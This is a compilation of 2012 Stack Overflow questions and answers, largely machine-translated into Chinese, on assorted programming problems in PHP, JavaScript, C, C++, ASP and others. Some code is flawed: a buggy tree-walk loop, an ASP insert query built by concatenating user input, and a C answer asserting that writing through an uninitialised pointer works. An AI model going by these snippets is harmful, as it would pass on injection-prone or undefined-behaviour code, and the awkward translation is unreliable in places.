假设您有双向树，您应该简单地调用此方法两次，复杂度将为 O(k)，其中 k=n+m，其中 n 和 m - 两棵树的高度。

```
isSubtree(Node n1, Node n2){
   while(n2.parent != null){
      if(n2.parent == n1){
         return true;
      }
      n2=n2.parent;
   }
   return false;
} 
```

如果你能记住访问过的父节点，你可以做得更好：

```
isParent(Node n1, Node n2){
   Set<Node> parents = new HashSet<Node>();
   parents.add(n1);
   parents.add(n2);
   while(n1.parent != null || n1.parent != null){
        if (parents.contains(n1.parent)){
            n1 is subtree of n2
        }
        if (parents.contains(n2.parent)){
            n2 is subtree of n1
        }
       parents.add(n1.parent);
       parents.add(n2.parent);
       n1=n1.parent;
       n2=n2.parent;
   }
   not a subtrees
} 
```

# php - 从 mySQL 切换到 noSQL - 词典网站

> ID：12146628
> 
> 赞同：0
> 
> 时间：2012-08-27T17:28:30.603
> 
> 标签：php, mysql, mongodb, database

我正在开发一个包含各种语言的词典网站，我可以将这种语言的每个人翻译成其他语言，我目前正在使用 mySQL，例如，如果我想将英语翻译成中文，我有一个表“en_ch”，其中包含所有带有翻译的单词，每个表大约有 90.000 - 150.000 个条目。所以mySQL相当慢，而且也很难映射所有属性，一个翻译可以有元信息，例如欧罗巴可能意味着大陆或木星的月亮，所以我有一个类型标签可以是'Geo'' astro' 'med' 等......用户也可以评价翻译的好坏，一种语言的一个词可以有另一种语言的多个翻译，或者可能只有一个，如果我使用数据库规范化，事情变得真的如果我查询元信息，速度会很慢。

所以我认为使用 NoSQL 数据库可能比 RDBMS 有一些好处。问题是.. 我对 NoSQL 不太了解，我以前从未使用过它，所以我在这里询问我正在做的事情是否有某种最佳实践，或者这是否是一个好主意。

如果我使用 mongoDB，我会为每个翻译创建一个文档（/english -> German / German -> chinese / ..）并将每个翻译保存为一个列表，其中键是第一种语言，值是翻译，我也认为可以像上面提到的那样赋予每个值属性（对吗？）

这是最好的方法吗？

查询会比在 mySQL 中更快吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T09:52:24.700

最有可能的是，您最好的工具已经存在，它被称为 dict、字典服务器、客户端以及各种字典和工具。

还有一个`rfc 2229`定义`dict protocol`. 这些工具（服务器、客户端和转换器）通常打包并在大多数 Linux 发行版中找到。

请查看[http://www.dict.org/](http://www.dict.org/)了解更多信息。

# javascript - 消除 JavaScript 中的多个 OR 条件

> ID：12146629
> 
> 赞同：0
> 
> 时间：2012-08-27T17:28:38.837
> 
> 标签：javascript

关于检查变量值是否可以是多个值之一的最有效方法的任何建议，而不是尝试使用与一堆 || 连接的长 if 条件 （或）？

我看到了类似的东西，`if (value in {'thing1':1, 'thing2':1, 'thing3':1})`但我不完全确定它是如何工作的。

被`in`认为是什么？运营商？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T18:48:48.713

如果您的值不是字符串，则使用`in`或[在 Javascript 中将多个条件组合为一个中](https://stackoverflow.com/questions/1561257/combining-multiple-conditions-into-one-in-javascript)`indexOf`所示的方法将比链式 OR 测试效率低得多，因为这两者都要求您将值转换为字符串并进行字符串比较. 将变量与其本机值进行比较几乎总是更有效。

假设您正在寻找与模式不匹配的值（例如找出您的测试数是奇数还是 2 的幂），您可以做一些事情来提高链式 OR 测试的速度。例如，首先测试最可能的值将提高整体性能；例如，如果 X 经常是 5 而不是 7，那么：

```
if (X == 5 || X == 7) 
```

从长远来看，将比：

```
if (X == 7 || X == 5) 
```

因为条件测试在表达式为真时终止。

假设您的值*是*字符串，`in`and`indexOf`方法不会比类似构造的链式 OR 更有效，并且考虑到浏览器的变幻莫测，可能会更糟。除非您可以确定要测试的值中的模式，否则在找到匹配项之前无法检查每个值。

# javascript - 谷歌分析 trackEvent 是如何工作的？

> ID：12146632
> 
> 赞同：4
> 
> 时间：2012-08-27T17:28:43.957
> 
> 标签：javascript, google-analytics

我试图了解这将如何工作：

```
_gaq = _gaq || [];

_gaq.push(['trackEvent', 'something', 'bleee']); 
```

好的，所以我明白了，我正在将数据推送到一些魔术数组中。但是谷歌的脚本怎么知道我已经这样做了？它必须要么轮询这个数组（不太可能），要么在用户离开页面时对其进行处理。

我发现在离开页面时发出请求通常会导致连接在请求完成之前关闭。

有人可以向我解释这个魔法是如何工作的吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-27T17:31:42.603

`.push()`Google 使用自定义方法创建了自己的对象。因此，当您将某些东西推送到“阵列”上时，它会激活更多代码（一个函数）来创建跟踪像素和 wallah。

`_gaq`Google 这样做是为了如果您在评估 GA 代码段之前尝试使用数组的 push 方法，那么您只是创建了一个要发送给 Google 的命令队列（在标准数组中）。如果 GA 代码段已被评估，那么您实际上正在运行 Google 创建的自定义函数来替换该`.push`方法。

> 此函数名为 push，以便在 Analytics 完全加载之前使用数组代替 _gaq。在加载分析时，命令将被推送/排队到阵列上。当 Analytics 完成加载时，它会用 _gaq 对象替换数组并执行所有排队的命令。对 _gaq.push 的后续调用解析为该函数，该函数在推送命令时执行命令。
> 
> *来源：[https](https://developers.google.com/analytics/devguides/collection/gajs/methods/gaJSApi_gaq#_gaq.push) ://developers.google.com/analytics/devguides/collection/gajs/methods/gaJSApi_gaq#_gaq.push *

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:40:57.237

加载库时，谷歌分析 js 库会读取数组 _gaq。_gaq 只是成功加载库时要调用的方法列表（及其参数）。Piwik，另一个网络分析系统，使用相同的方法。

# python - 无法使用 python (2.7.3)、bash 和 gnome3 设置背景图像

> ID：12146634
> 
> 赞同：0
> 
> 时间：2012-08-27T17:29:08.597
> 
> 标签：python, bash

```
#!/usr/bin/env python
import os
bashCommand = "gsettings set org.gnome.desktop.background picture-uri file:///home/{me}/autowallpaperchanger/" + pic_name
print bashCommand
os.system(bashCommand) 
```

打印结果：

```
gsettings set org.gnome.desktop.background picture-uri file:///home/{me}/autowallpaperchanger/wallpaper-1252048.jpg 
```

将打印结果复制并粘贴到终端使更改成功，因此命令是正确的，但 os.system 由于某种原因没有正确处理请求。

谢谢！

编辑完整脚本： http: [//pastebin.com/bUKYYrn1](http://pastebin.com/bUKYYrn1)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-09-24T13:40:03.370

使用原始字符串有效。

```
#!/usr/bin/env python
import os
bashCommand = r"gsettings set org.gnome.desktop.background picture-uri file:///home/{me}/autowallpaperchanger/" + pic_name
print bashCommand
os.system(bashCommand) 
```

在python中正确的做法是

```
from gi.repository import Gio

SCHEMA = 'org.gnome.desktop.background'
KEY = 'picture-uri'

def change_background(filename):
    gsettings = Gio.Settings.new(SCHEMA)
    gsettings.set_string(KEY, "file://" + filename)
    gsettings.apply()

if __name__ == "__main__":
    change_background("/home/{me}/autowallpaperchanger/pic_name") 
```

# java - 未在页脚 JSP 中加载 fmt 标记库的资源

> ID：12146635
> 
> 赞同：0
> 
> 时间：2012-08-27T17:29:09.520
> 
> 标签：java, jsp, taglib, tld, msgfmt

我有 3 个 JSP。header.jsp、center.jsp 和 footer.jsp。它们一起形成一个登录页面。它们中的每一个都按上面提供的顺序执行。

现在我正在尝试使用 fmt tld 在我的网站上显示一些静态内容。

我在 header.jsp 中的代码有

```
<%@ taglib uri="http://java.sun.com/jstl/fmt" prefix="fmt" %>
....
....
<fmt:requestEncoding value="UTF-8" />
<fmt:setLocale value="en" scope="session"/>
<fmt:setBundle basename="content"/>
<fmt:message key="page.header.text"></fmt:message> //this gets displayed 
```

在 footer.jsp 我有以下内容：

```
<%@ taglib uri="http://java.sun.com/jstl/fmt" prefix="fmt" %>
....
....
<fmt:message key="page.header.text"></fmt:message> 
```

在这种情况下，将显示以下内容..

```
???page.footer??? 
```

表示它无法找到该属性。如果我定义了我在页脚的页眉中添加的设置器，那么消息就会正确发送。但理想情况下我不应该这样做..我在这里做错了什么，捆绑没有在页脚中被拾起？

# javascript - 从函数触发 JQuery UI Datepicker 并将日期存储到 var

> ID：12146638
> 
> 赞同：0
> 
> 时间：2012-08-27T17:29:36.220
> 
> 标签：javascript, jquery, html, jquery-ui, frameworks

我需要你的帮助。

是否可以通过编程方式使用 Jquery 选择器，即。通过调用函数触发日期选择器，然后将所选日期存储到 var 中，而不是隐藏输入框？

对此的任何帮助将不胜感激。

我当前的示例从函数触发日期选择器，但使用隐藏的输入框。

```
<html>

<head>

<!-- LOAD JQUERY LIBRARY: -->  
    <link   href="jq/jquery-ui.css"         type="text/css" rel="stylesheet" />
    <script src="jq/jquery.min.js"          type="text/javascript"> </script>
    <script src="jq/jquery-ui.min.js"       type="text/javascript"> </script>

<script type="text/javascript">

function test() {

$("#d1").datepicker().datepicker("show");

}

</script>

</head>

<body>

<input style="display: none" type="text" id="d1">

<a href="javascript:test()">test</a>

</body>

</html> 
```

提前致谢，

干杯，

周杰伦

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:37:18.747

只需将其附加到 div 而不是输入控件。

[JSFiddle](http://jsfiddle.net/d2Zsu/)。

的HTML：

```
<div id="d1"></div>

<a href="#" id="test">test</a> 
```

JS：

```
$('#test').click(function(){
    var datePickerValue = null;

    $("#d1").datepicker().datepicker("show").change(function ()
    {
      datePickerValue = $(this).val();
      alert("You picked: " + datePickerValue);
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:35:23.773

我让它在这个小提琴中工作，虽然隐藏的输入框看起来很难看。

[http://jsfiddle.net/QfjP5/](http://jsfiddle.net/QfjP5/)

# batch-file - GIMP 2: how to batch assign sRGB profile to a lot of images into various subfolder

> ID：12146640
> 
> 赞同：2
> 
> 时间：2012-08-27T17:29:46.943
> 
> 标签：batch-file, gimp, srgb

I've an entire tree with PNG images

I need to - open - assign sRGB profile - close

to every of them

(about 2000 images)

Is there a way to do this via gimp 2?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-27T18:03:58.497

你可以[`imagemagick`](http://www.imagemagick.org/script/index.php)用来做这个。[示例](http://www.imagemagick.org/Usage/formats/#color_profile)：

```
convert rgb_image.jpg +profile icm \
        -profile sRGB.icc  -profile USCoat.icm cmyk_image.jpg 
```

`mogrify`是标准命令iirc。这[是一个做类似事情的例子](http://www.imagemagick.org/discourse-server/viewtopic.php?f=1&t=16470#p60137)：

```
FOR /R %%a IN (*.jpg) DO mogrify -profile sRGB.icc "%%a" 
```

Linux/ [bash 递归目录循环](https://stackoverflow.com/questions/4638874/how-to-loop-through-a-directory-recursively)示例：

```
for f in $(find /tmp -name '*.png'); do mogrify $f ... ; done 
```

（`...`用你的 mogrify 命令替换，`$f`是文件）

# actionscript-3 - Using multiple or only one eventlisteners in actionscript 3

> ID：12146641
> 
> 赞同：1
> 
> 时间：2012-08-27T17:29:48.523
> 
> 标签：actionscript-3, flash, class, events, actionscript

Sorry for the lame question but I don't know how to search for it. So if I have two events from the same class like:

```
package  {
import flash.events.Event;

public class StylingEvent extends Event{
    public static const BLUE_BG:String = "blue_bg";
    public static const GREEN_BG:String = "green_bg";

    public function StylingEvent(type:String) {
        super(type);
    }
}} 
```

Do i need to add two eventlisteners like:

```
gameData.addEventListener(StylingEvent.BLUE_BG, onChangeBg);
gameData.addEventListener(StylingEvent.GREEN_BG, onChangeBg); 
```

Or is it possible like:

```
gameData.addEventListener( [any type of stylingEvent] , [some method]); 
```

Thanks

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-27T17:41:38.207

如上所示，是的，您需要添加两次事件侦听器。

要仅添加一个事件侦听器，您可以修改您的事件类，以便只有一个事件名称：

```
public static const BACKGROUND_CHANGED = "backgroundChanged"; 
```

然后向存储颜色的事件类添加一个属性：

```
public var backgroundColor:uint; 
```

当需要调度事件时，指定颜色：

```
var event:StylingEvent = new StylingEvent();
event.backgroundColor = 0x0000FF;
dispatchEvent(event); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:41:49.950

**我认为**您将需要添加两个事件侦听器。请参见此处：`addEventListener(type:String, listener:Function)`他们正在使用您正在定义的那些常量的字符串表示形式。我不知道如果这些字符串相同会发生什么。你可以自己写一个这样的函数来保存一些代码：

```
function addAllEvents(obj:Object, fun:Function) {
   obj.addEventListener(StylingEvent.BLUE_BG, fun);
   obj.addEventListener(StylingEvent.GREEN_BG, fun);
} 
```

# c++ - Base operator called instead of Derived one - Normal behaviour?

> ID：12146643
> 
> 赞同：4
> 
> 时间：2012-08-27T17:29:58.517
> 
> 标签：c++, inheritance, virtual

As I'm currently playing with C++, I come up to an issue. Code below:

```
#include        <iostream>

class Base {
public:
  virtual ~Base()                   {}

  virtual Base&         operator=(const Base& o)
  {
    std::cout << "Base operator called" << std::endl;
    return *this;
  }
};

class Derived : public Base {
public:
  virtual ~Derived() {}

  virtual Base&         operator=(const Base& o)

  {
    std::cout << "Derived operator called" << std::endl;
    return *this;
  }
};

int     main(void)
{
  Derived       a;
  Derived       b;
  Base&         c = a;
  Base&         d = b;

  a = b;                        // Base called                                                                                                                                 
  a = static_cast<Base>(b);     // Derived called                                                                                                                              
  a = d;                        // Derived called                                                                                                                              
  c = d;                        // Derived called                                                                                                                              
  return (0);
} 
```

The comment show what output I get. The last 3 results are very much predictable, but I can't understand the first.

As shown in the second one (static_cast), Derived::operator= is called when the right operand is a Base class. However, g++ (4.5.3-r2, gentoo Linux) success to understand that it must use the 'Base' class, but doesn't go down the inheritance tree.

So I was expecting either Derived::operator= to be called, or g++ complaining for no "Derived& Derived::operator=(const Derived&)". Could someone explain this behaviour to me ? Thanks!

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:40:00.677

有一个**编译器生成**的复制分配，即`operator=(Derived &)`在`Derived`类中，因为**不是**`Derived::operator=(Base const&)`复制分配。如果您在代码中使用赋值，这**不会阻止编译器生成复制赋值。****`Derived`**

 ****所以这一行：

```
 a = b;  // Base called 
```

`operator=(Derived &)`调用为类生成的编译器`Derived`，然后调用`operator=(Base const&)`. 因此`Base called`被打印出来。

实验：将此添加到`Derived`类中：

```
Derived & operator=(Derived const & obj) : Base(obj)
{
   std::cout << "copy-assignment called" << std::endl;
   return *this;
} 
```

现在，`a=b`将导致打印：

> 基称为
> 复制分配称为

还要注意打印*顺序*。

希望能澄清你的疑惑。

* * *

现在这个，

```
a = static_cast<Base>(b);  /// Derived called 
```

在功能上等同于：

```
Base ___generated_tmp = static_cast<Base>(b);
a = ___generated_tmp; 
```

表示，`a = ___generated_tmp`调用`operator=(Base const&)`，因为类型`___generated_tmp`是`Base`。

正如您似乎已经知道的那样，其余两个非常清楚。****

# vb.net - How to open Excel in vb.net

> ID：12146644
> 
> 赞同：0
> 
> 时间：2012-08-27T17:30:01.313
> 
> 标签：vb.net, excel

I followed this site to get me started on my program, [here](http://vb.net-informations.com/excel-2007/vb.net_excel_2007_create_file.htm)

When I add the reference and declare my variables:

```
Imports Excel = Microsoft.Office.Interop.Excel
Class XCel
    Dim xlApp As New Excel.Application
    Dim xlWorkBook As Excel.Workbook
    Dim xlWorkSheet As Excel.Worksheet
End Class 
```

I get an ambiguity error, " 'Application' is ambiguous in the namespace 'Microsoft.Office.Interop.Excel' "

I've read a few pages saying to remove the reference then re-add it and updating the PIAs but none have helped.

Is there a simpler way to open an Excel? Something I'm missing in my code/project to get it to work?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:33:46.230

> 有没有更简单的方法来打开 Excel？

EPPlus 开源项目使得使用 Excel 文件比使用 Office 互操作更容易：

> EPPlus 是一个 .net 库，它使用 Open Office Xml 格式 (xlsx) 读取和写入 Excel 2007/2010 文件。

[http://epplus.codeplex.com/](http://epplus.codeplex.com/)

> 我收到一个模棱两可的错误，“'Application' 在命名空间 'Microsoft.Office.Interop.Excel' 中是模棱两可的”

当我在同一台机器上安装多个 Office 版本的 PIA 时，我遇到了与您现在遇到的相同的错误。我最终解决了这个问题，只在我的开发机器上安装了最新版本的 Excel（因为毕竟，我想拥有最新版本的 Office 用于一般工作）并创建一个具有我需要的最旧版本 Office 的虚拟机支持我用作构建机器来进行最终版本构建并为客户创建安装程序。

# php - php获取`日期（“Ymd”）-1`

> ID：12146645
> 
> 赞同：0
> 
> 时间：2012-08-27T17:30:05.337
> 
> 标签：php, date

我存储了一些`error_log`日期作为他们的名字。像`20120827.txt`

现在我写了一些 php 脚本来查看`error_log`.

我需要做一些判断：

```
if(file_exists(date("Ymd").'.txt')){ 
   $html = file_get_contents(date("Ymd").'.txt');
}else{
   $html = file_get_contents((date("Ymd")-1).'.txt');//load yesterday's `error_log`.
} 
```

但这不适合约会之类的`20120801.txt`，怎么办`date("Ymd")-1`？

我试过`date("Ymd", (strtotime($date) . " -1 day"));// return:19700101`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-27T17:31:55.440

如果你想要昨天的日期，你可以做

```
date("Ymd", time() - 3600*24); 
```

或者您可以使用该`DateTime`对象：

```
$date = new DateTime();
$date->modify("-1 day");
echo $date->format("Ymd"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:33:09.343

您可以使用 PHP[`mktime`](http://php.net/mktime)获得非常精确的日期：

```
date('Ymd', mktime(0, 0, 0, date('m'), date('d') - 1, date('Y'))); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-27T17:36:25.530

试试这个......最简单的一个......

```
date('Ymd',strtotime( "yesterday" )); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-27T17:34:56.193

你需要`strtotime`像这样使用：

```
date('Ymd', strtotime('-1 day')); 
```

这是带有输出的粘贴： http: [//codepad.org/iD7M9VN7](http://codepad.org/iD7M9VN7)

# asp-classic - Need to send Email attachment with ASP Vbscript code

> ID：12146649
> 
> 赞同：0
> 
> 时间：2012-08-27T17:30:22.717
> 
> 标签：asp-classic, vbscript

I am trying to send attachemnet with the below code in a classic ASP application.This application fetches mail to , mail from address etc from DB. Now the catch is from the frond end when the user browses a document then without storing the documnet anywhere(i.e in database or server), I need to attach the document as an attachemnt with the below mail piece code..Pls suggest..

```
sql = "insert INTO RSP_SSR_ENTRY(SR_ID_NBR, SA_ID_NBR, IMO_NBR ,INSPECTION_SEQ_NBR, INSPECTION_DTM, PO_ID_NBR, OPERATIONAL_STATUS_TXT, REPORT_Q2_IND, REPORT_Q3_IND, REPORT_Q4_IND, REPORT_Q5_IND, REPORT_Q6_IND,   REPORT_Q7_IND, REPORT_Q8_IND, REPORT_Q9_IND, REPORT_Q10_IND, REPORT_Q11_IND, REPORT_Q12_IND, REPORT_Q13_IND, REPORT_QA_IND, REPORT_QB_IND, SUBMITTED_DTM) VALUES(0, " & said & ", " & ssr_imo & ", " & ssr_ins_nr & ", " & ssr_ins_date & ", " & ssr_port_id & ", '" & opStat & "', '" & ssr_q2 & "', '" & ssr_q3 & "', '" & ssr_q4 & "', '" & ssr_q5 & "', '" & ssr_q6 & "', '" & ssr_q7 & "', '" & ssr_q8 & "', '" & ssr_q9 & "', '" & ssr_q10 & "', '" & ssr_q11 & "', '" & ssr_q12 & "', '" & ssr_q13 & "','" & ssr_qa & "', '" & ssr_qb & "', "&right_now&")"

        debugNote sql
        session("sqlInsertText") = sql
        Set db1 = Server.CreateObject("ADODB.Connection")
        db1.Open GV_VIEW_DB_String 

        Set rsInsert = db1.Execute(sql)

            session("duplicateInsert_ssr") = false
            set rsInsert = nothing
            Set dbl = nothing 

        'lookup the name of the Ship
        shipName = ssr_ship_name & " ("&ssr_imo&")"

        'send an email for SSR
        mailbody = GV_EMAIL_TOP 
        'mailbody = mailbody & "For processing on " & FormatDateTime(dateadd("d", 1, now()), 1) & "<br />"
        mailbody = mailbody & "Date time of SSR Upload : " & Day(date()) & " " & MonthName(Month(date()), true) & " " & Year(date()) & " " & Hour(time()) & ":" & Minute(time()) &  "<br />"
        mailbody = mailbody & "Name and IMO number of Ship : " & shipName & "<br />"
        mailbody = mailbody & "Inspection number : " & ssr_ins_nr & "<br />"
        mailbody = mailbody & "Submitted by : " & subName  & " (" & subEmail & ")<br />"

        'mailsubject = "S.H.I.P - SSR report has been submitted "
        mailsubject = "SSR report for " & shipName &  "has been submitted "

        ShipEmail mailbody, "SHIP Admin user", GV_SSR_MAIL_TO, "", "", mailsubject 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-28T06:30:42.013

要发送文件，它必须始终（临时）存储在发送邮件的服务器上！

不知道您的 ShipEmail 功能是什么样的，并假设您正在使用 CDO.Message 它将是这样的：

```
Set cdoMessage = CreateObject("CDO.Message") 
cdoMessage.Subject = "Some Message" 
cdoMessage.From = "testfrom@test.com" 
cdoMessage.To = "testto@test.com" 
'cdoMessage.TextBody = "This is some sample message text." 
cdoMessage.HTMLBody = "This is some sample html message text." 
'File on Server!
cdoMessage.AddAttachment "c:\emailpickup\test.txt"
cdoMessage.Send 
```

如果要嵌入图像，请查看`AddRelatedBodyPart`

# c - Trouble copying a string in C?

> ID：12146651
> 
> 赞同：0
> 
> 时间：2012-08-27T17:30:26.647
> 
> 标签：c, pointers

I am trying to copy the String an char pointer to another ?

I tried the code given below .compiled successfully but output is blank(no output) .

**a)** Where I was wrong?where my programming logic getting fail?

**b)** How can I improve this code to get desired output?

```
 void main()
    {
     char *p="krishna";
     char *q;

      while(*p!='\0')
      {
       *q++=*p++;
      }
      printf("%s",q);
      getch();
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:43:43.620

```
void main()
{
  char *p="krishna";
  char *q;

  /* When copying, you modify your pointers, so you need another one
  ** to store where your string is starting. */
  char *r;

  /* Until now, q points to nowhere.
  ** You need to allocate the place it should point: */
  r = q = malloc(strlen(p) + 1);
  /* Plus 1 because C string uses one extra character in the end,
  ** the NULL ('\0') character. */

  while(*p!='\0')
  {
   *q++=*p++;
  }

  /* Until now, you've copied every character, except the NULL char at the end.
  ** you must set it in order for it to be a valid string. */
  *q = '\0';

  /* Now q points to the last (NULL) character of the string.
  ** In order to print it, you will need a pointer to the start of the string,
  ** that is why we need r: */
  printf("%s",r);

  /* When you are done using a memory buffer you allocated yourself,
  ** you must free it so it can be reused elsewhere. */
  free(r);

  getch();
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:51:23.523

> **a）我错在哪里？我的编程逻辑在哪里失败？**

好吧，你做错了几件事。一是`void main`不规范；的返回类型`main`应该是`int`.

话虽如此，您正在寻找的*真正*问题与未初始化的事实有关`q`，但您仍试图通过它复制到内存（这是未定义的行为）。要纠正这个问题，请尝试分配`q`，例如

```
char *q = malloc(8); 
```

请注意，您以后还必须注意`free`此处分配的内存。

除此之外，您也忘记了复制`NUL`终止符。

```
*q = 0; 
```

...在您的复制循环之后。您还在增加指针后进行打印，因此在您调用`q`时它将不再位于字符串的开头。`printf`您应该将头部的副本存储在另一个变量中。此外，请小心使用`printf`没有任何换行符的纯文本，因为流可能会被缓冲，因此可能保持未刷新——使用显式`fflush(stdout);`

* * *

> **b）如何改进此代码以获得所需的输出？**

好吧，我能想到的第一个最直接的改进是使用[`strcpy`](http://en.cppreference.com/w/c/string/byte/strcpy).

```
#include <stdio.h>

main() {
  const char p[] = "krishna";
  char q[sizeof p];
  strcpy(q, p);
  puts(q);
  getchar();
  return 0;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T17:33:05.410

你不是说你想要 q 多少内存，所以，你试图超越其他东西的内存。因此，使用 malloc 或数组。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-27T17:33:48.103

您需要`'\0'`在 q 的末尾放置一个字符。您还需要为其分配足够的内存。

```
#include <string.h>
#include <stdlib.h>

int main()
{
  char *p="krishna";
  int size = strlen(p) + 1;
  char *q = (char *) malloc(size);
  char *qi = q;

  do
  {
   *q++=*p;
  } while(*p++!='\0');

  q = qi; //reset q to the beginning of the string

  printf("%s",q);
  getch();
  return 0;
} 
```

我认为这应该有效

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-27T17:34:27.317

您正在使用 for 循环在末尾移动指针。此外，您也应该分配内存`q`。

尝试这个：

```
void main()
{
 char *p="krishna";
 char *q = malloc(sizeof(char) * 20);
 char *temp = NULL;

 /* save q */
 temp = q;
  while(*p!='\0')
  {
   *q++=*p++;
  }
  /* reset saved q */
  q=temp;
  printf("%s",q);
  getch();
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-08-27T17:34:30.513

**a）**您移动`q`但不将其重置为字符串的开头。

正如许多其他人指出的那样，您还需要复制操作的目标是分配内存的某个地方，在堆上`char *buf = malloc(BUF_SIZE)`或在堆栈上`char buf[BUF_SIZE]`。

最后，目的地必须是零终止的。

**b)**使用专用 API 通常比自制循环更具可读性和性能。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-08-27T17:31:53.287

您应该为“q”分配内存以保存复制的字符串。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-08-27T17:40:58.627

在您提供的这个示例中，您没有为新的字符数组分配内存，而是只是将字符复制到未知缓冲区中。这可能会导致各种问题（阅读有关缓冲区溢出和攻击的信息）。此外，一旦您完成将字符复制到未知缓冲区中，该缓冲区将不再指向字符串的开头，而是指向字符串的结尾。如果您的想法是将字符数组复制为 C 中的字符串，则可以使用以下代码执行此操作：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void main()
{
  char *p="krishna";
  char *q = (char*) malloc(sizeof(char) * (strlen(p) + 1));

  strcpy(q, p);

  printf("%s", q);
  getchar();
  free(q);
  return 0;
} 
```

在大多数情况下，NULL 字符 ('\0') 的数组末尾的额外字节是不必要的，但为了正确起见，它被包括在内，因为字符数组应该由 NULL 字符结束分隔。

通过使用 malloc，您可以为我们将字符串复制到的缓冲区分配（动态）内存。任何时候动态分配内存，它也应该在以后被释放，否则它将继续被不必要地使用。为了释放 malloc 的这种使用，在应用程序返回之前，最后使用了“free”命令。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-08-27T18:39:12.537

正如许多人告诉我将 q 的值初始化为内存地址一样。我认为没有必要这样做。因为尽管存在未定义的行为，但这段代码仍能正常工作。

```
 int main()
 {
 char *p="krishna";
 char *q,*r;
 r=q;

  while(*p!='\0')
  {
   *q++=*p++;
  }
   *q='\0';
    q=r;
  printf("%s",q);
  getch();
  return 0;
 } 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-08-27T17:46:24.357

一项重要的改进建议，目前还没有（其他人已经指出了与字符串相关的问题）

```
Your declaration of main is not correct. 
The return value should  not be  void  but int 
```

# knockout.js - How to combine throttling with subscription in knockoutjs?

> ID：12146652
> 
> 赞同：9
> 
> 时间：2012-08-27T17:30:29.707
> 
> 标签：knockout.js

I have a function that performs some communication with a server to report the current screen geometry, etc.

```
 function sendScreenLayout() { 
        logElementLocations(exp.getPageCoordinates());
    }; 
```

I subscribe this function to some events in my code like this:

```
viewModel.onLayoutChange.subscribe(sendScreenLayout);
$('#right-splitter > #mainContent').resize(sendScreenLayout);
$(window).resize(sendScreenLayout);
...
setTimeout(sendScreenLayout, 1); 
```

Some of these events may get sent too frequently to be usefully handled by the server, and I would like to throttle the requests to some reasonable rate.

The best I could come up with was something like this:

```
var triggerSend = ko.observable();

ko.computed(function() {
    triggerSend();
    logElementLocations(exp.getPageCoordinates());
}).extend({throttle: 200});

function sendScreenLayout() {
    triggerSend.valueHasMutated();
} 
```

Is there a more succinct way of capturing this pattern, or is this the way to go?

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-27T20:23:50.307

如果您使用的是[Underscore](http://underscorejs.org/)，则可以这样使用[`debounce`](http://underscorejs.org/#debounce)：

```
var sendScreenLayout = _.debounce(function() { 
    logElementLocations(exp.getPageCoordinates());
}, 200);
...
$(window).resize(sendScreenLayout);
... 
```

否则，它并不是真正的 Knockout 直接支持的模式。您提出的解决方案似乎足够好，尽管这里有一个替代方案：

```
var triggerSend = ko.computed({
    read: function() {},
    write: function(dummy) {
        logElementLocations(exp.getPageCoordinates());
    }
}).extend({throttle: 200});

function sendScreenLayout() {
    triggerSend(true);
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-05-31T20:53:17.890

假设您`viewModel.onLayoutChange`是可观察的，您可以简单地执行以下操作：

```
ko.computed(function() {
    viewModel.onLayoutChange(); //implicitly subscribes this callback to changes
    logElementLocations(exp.getPageCoordinates());
}).extend({throttle: 200}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-20T15:57:50.957

上面的答案很优雅！我有一个必须排序的列表，顺序以及到那时需要作为用户偏好保存到服务器的内容。我想在 3 个不同的属性更改上更新服务器，但不是每次更改。做这样的事情。

```
ko.computed(function () {
    self.sort.direction();
    self.sort.order();
    self.sort.groupByPIC();

    if (!_firstLoad) {
        _dataService.updateSortPreferences({
            model : new _jsSortModel(self.sort)
        });
    }
}).extend({ throttle: 2000 }); 
```

允许我使用一个函数为多个属性下标，并让用户有时间在更新服务器之前停止单击。

很好谢谢！

# javascript - Highlight.js 为每个使用特定的 css 文件 tag

> ID：12146660
> 
> 赞同：1
> 
> 时间：2012-08-27T17:31:04.500
> 
> 标签：javascript, jquery, html, css, syntax-highlighting

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:39:43.557

You can wrap any specific styles you want with an attribute selector like this:

```
pre code[lang="xcode"] {
    /* xcode specific styles */
} 
```

You can then either save those styles in the same `xcode.css` or in a new css file and link it in the header.

Here's a fiddle demo: [http://jsfiddle.net/stevenschobert/vpMEJ/](http://jsfiddle.net/stevenschobert/vpMEJ/)

# colors - Why the tabs of sherlock action bar are with different colors?

> ID：12146661
> 
> 赞同：1
> 
> 时间：2012-08-27T17:31:12.190
> 
> 标签：colors, tabs, actionbarsherlock

This happen in some android devices with a smallest display.

